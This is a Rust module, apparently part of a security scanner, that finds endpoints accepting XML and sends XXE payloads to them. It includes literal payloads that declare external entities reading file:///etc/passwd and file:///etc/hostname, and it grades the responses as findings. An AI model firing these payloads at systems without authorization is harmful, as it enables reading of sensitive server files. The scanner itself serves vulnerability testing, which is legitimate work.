//! XXE Engine — XML endpoint discovery, XXE payload injection, blind XXE marker check.
//! MITRE: T1190 (Exploit Public-Facing Application).

use crate::engine_result::{print_result, EngineResult};
use serde_json::json;
use std::time::Duration;

fn make_client() -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .danger_accept_invalid_certs(weissman_core::tls_policy::danger_accept_invalid_certs())
        .build()
        .unwrap_or_else(|_| reqwest::Client::new())
}

fn base_url(target: &str) -> String {
    let t = target.trim().trim_end_matches('/');
    if t.starts_with("http://") || t.starts_with("https://") {
        t.to_string()
    } else {
        format!("https://{}", t)
    }
}

/// XXE payload that attempts to read /etc/passwd inline.
const XXE_INLINE: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>"#;

/// XXE payload that attempts to read /etc/hostname.
const XXE_HOSTNAME: &str = r#"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><test>&xxe;</test>"#;

pub async fn run_xxe_result(target: &str) -> EngineResult {
    let client = make_client();
    let base = base_url(target);
    let mut findings = Vec::new();

    let xml_paths = [
        "/",
        "/api",
        "/api/v1",
        "/xml",
        "/upload",
        "/import",
        "/soap",
        "/service",
        "/ws",
        "/api/import",
        "/api/xml",
    ];

    for path in &xml_paths {
        let url = format!("{}{}", base, path);

        // First: probe with minimal valid XML to check if the endpoint accepts XML
        let ping_resp = client
            .post(&url)
            .header("Content-Type", "application/xml")
            .body("<ping/>")
            .send()
            .await;

        let accepts_xml = match ping_resp {
            Ok(ref r) => r.status().as_u16() != 415 && r.status().as_u16() != 404,
            Err(_) => false,
        };

        if !accepts_xml {
            continue;
        }

        // Endpoint may accept XML — try XXE injection
        if let Ok(resp) = client
            .post(&url)
            .header("Content-Type", "application/xml")
            .body(XXE_INLINE)
            .send()
            .await
        {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();

            // Check for /etc/passwd content
            if body.contains("root:") || body.contains("/bin/bash") || body.contains("/bin/sh") {
                findings.push(json!({
                    "type": "xxe",
                    "title": "XXE: /etc/passwd Successfully Read",
                    "severity": "critical",
                    "mitre_attack": "T1190",
                    "description": format!(
                        "XXE confirmed at {}. The server returned contents of /etc/passwd, allowing arbitrary file read.",
                        url
                    ),
                    "value": url
                }));
            } else if status == 200 || status == 201 || status == 500 {
                // Endpoint processed the XML — check if it errored on entity expansion
                let entity_processed = body.contains("xxe") || body.contains("DOCTYPE") || body.contains("ENTITY");
                if entity_processed {
                    findings.push(json!({
                        "type": "xxe",
                        "title": "XXE Entity Reference Reflected in Error",
                        "severity": "high",
                        "mitre_attack": "T1190",
                        "description": format!(
                            "Endpoint {} processed XXE payload and reflected entity/DOCTYPE references in the response. Blind XXE may be exploitable.",
                            url
                        ),
                        "value": url
                    }));
                } else {
                    findings.push(json!({
                        "type": "xxe",
                        "title": "XML Endpoint Accepts External Entities (XXE Candidate)",
                        "severity": "medium",
                        "mitre_attack": "T1190",
                        "description": format!(
                            "Endpoint {} accepted an XML payload with external entity declarations (HTTP {}). Out-of-band XXE testing is recommended.",
                            url, status
                        ),
                        "value": url
                    }));
                }
            }
        }

        // Try /etc/hostname variant
        if let Ok(resp) = client
            .post(&url)
            .header("Content-Type", "application/xml")
            .body(XXE_HOSTNAME)
            .send()
            .await
        {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            // hostname files are typically short single-line alphanumeric strings
            if !body.is_empty() && body.trim().len() < 64 && !body.contains('<') && status == 200 {
                findings.push(json!({
                    "type": "xxe",
                    "title": "XXE: /etc/hostname Read Candidate",
                    "severity": "high",
                    "mitre_attack": "T1190",
                    "description": format!(
                        "Endpoint {} may have returned the server hostname via XXE. Verify out-of-band.",
                        url
                    ),
                    "value": body.trim().to_string()
                }));
            }
        }
    }

    // Check if the root endpoint advertises XML support via Content-Type
    if let Ok(resp) = client.get(&base).send().await {
        for (name, value) in resp.headers().iter() {
            let val_str = value.to_str().unwrap_or("").to_lowercase();
            if name.as_str().to_lowercase() == "content-type" && val_str.contains("xml") {
                findings.push(json!({
                    "type": "xxe",
                    "title": "XML Content-Type Detected in Response",
                    "severity": "info",
                    "mitre_attack": "T1190",
                    "description": format!("Target {} responds with XML Content-Type. XML-parsing endpoints should be tested for XXE.", base),
                    "value": val_str
                }));
                break;
            }
        }
    }

    let message = if findings.is_empty() {
        "No XXE vulnerabilities detected".to_string()
    } else {
        format!("{} XXE issue(s) found", findings.len())
    };
    EngineResult::ok(findings, message)
}

pub async fn run_xxe(target: &str) {
    print_result(run_xxe_result(target).await);
}
